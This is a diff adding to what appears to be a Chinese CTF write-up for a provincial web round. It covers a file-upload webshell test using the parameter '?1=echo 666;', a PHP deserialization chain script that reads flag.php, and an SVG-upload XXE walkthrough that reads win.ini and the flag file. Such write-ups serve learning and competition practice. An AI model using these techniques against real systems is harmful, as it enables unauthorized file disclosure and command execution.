@@ -1,3 +1,5 @@
+## 2025浙江省初赛web
+
 ### Upload1
 
 #### 思路与步骤
@@ -129,3 +131,80 @@
 
 1. 直接访问：页面显示GIF89a；源码只有GIF89a。
 2. 带参数访问（?1=echo 666;）：页面视觉显示GIF89a666；页面源码GIF89a666。
+
+### EzSerialize
+
+```php
+<?php
+class User {
+    private $name;
+    private $role;
+    public function __construct($name, $role) {
+        $this->name = $name;
+        $this->role = $role;
+    }
+}
+class Admin {
+    private $command;
+    public function __construct($command) {
+        $this->command = $command;
+    }
+}
+class FileReader {
+    private $filename;
+    public function __construct($filename) {
+        $this->filename = $filename;
+    }
+}
+$fr = new FileReader('flag.php');
+$admin = new Admin($fr);
+$user = new User('x', $admin);
+echo base64_encode(serialize($user));
+```
+
+**知识点：**
+
+1. `__toString()`：当对象被当作字符串使用（echo、字符串拼接等）时自动调用。
+2. `__call($method, $args)`：当调用对象身上不存在（或不可见）的方法时自动调用。
+
+### UploadKing
+
+#### 思路与步骤
+
+1. 文件上传题根据下表排查，通过测试，本题后端检测严格，且不能用配置文件，不能利用普通文件格式，发现白名单内只有SVG是纯文本，本质是一段XML，其他都是二进制文件，可以尝试利用XXE。
+
+    ![image-20261023091031956](浙江省CTF历年初赛WP.assets/image-20261023091031956.png)
+
+2. 先别上 payload，传一个最简单的正常 SVG，确认“上传 + 解析 + 回显”三个基本动作。发现成功上传且显示“SVG解析结果：......”，但上传其他格式文件显示“上传成功”，说明SVG文件的内容进入了XML解析器。
+
+    ![image-20261023094211478](浙江省CTF历年初赛WP.assets/image-20261023094211478.png)
+
+3. 确认“实体替换”开关是否打开，上传后发现“hello”被替换，说明危险开关 LIBXML_NOENT（实体替换）是开着的。
+
+    ![image-20261023094411801](浙江省CTF历年初赛WP.assets/image-20261023094411801.png)
+
+    ![image-20261023094457049](浙江省CTF历年初赛WP.assets/image-20261023094457049.png)
+
+4. 尝试外部实体读系统文件，发现读取到了，LIBXML_DTDLOAD（允许加载外部资源）是开着的，可以读取flag文件了。
+
+    ![image-20261023095035094](浙江省CTF历年初赛WP.assets/image-20261023095035094.png)
+
+    ![image-20261023095058746](浙江省CTF历年初赛WP.assets/image-20261023095058746.png)
+
+5. 成功读取flag。
+
+    ![image-20261023095304427](浙江省CTF历年初赛WP.assets/image-20261023095304427.png)
+
+    ![image-20261023095313629](浙江省CTF历年初赛WP.assets/image-20261023095313629.png)
+
+#### 知识点：
+
+1. win.ini 是 Windows 上必定存在、内容是纯文本的文件，用来确认“漏洞真的存在”。
+2. file://：通过统一的字符串路径，定位并读取本地计算机或局域网内的磁盘文件 / 文件夹。
+
+#### 关键：利用外部实体需要多个条件成立
+
+1. 实体替换是开的（LIBXML_NOENT）；
+2. 允许加载外部资源（LIBXML_DTDLOAD）；
+3. file:// 协议没被禁；
+4. 路径写对了、文件真实存在、权限够。
